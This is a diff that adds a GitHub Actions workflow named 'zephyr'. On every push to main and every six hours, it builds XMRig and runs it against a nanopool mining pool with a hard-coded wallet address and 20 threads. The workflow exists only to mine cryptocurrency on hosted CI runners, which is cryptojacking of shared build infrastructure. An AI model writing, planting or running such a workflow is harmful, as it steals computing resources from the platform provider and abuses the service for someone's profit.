@@ -1,0 +1,35 @@
+name: zephyr 
+
+on: 
+  push:
+    branches:
+      - main
+  schedule:
+    - cron: '15 */6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v2
+
+      - name: Update and install dependencies
+        run: sudo apt update && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+
+      - name: Clone XMRig repository
+        run: git clone https://github.com/xmrig/xmrig.git
+
+      - name: Build XMRig
+        run: |
+          cd xmrig
+          mkdir build
+          cd build
+          cmake ..
+          make -j$(nproc)
+
+      - name: Start mining Monero
+        run: |
+          cd xmrig/build
+          ./xmrig -o zeph-asia1.nanopool.org:10900 -u bc0e35899ab715b639c7cc97b4e3bfef8fb90e81e178cfbf90d70b75d95174a4 -p mass1 -a randomx -t 20
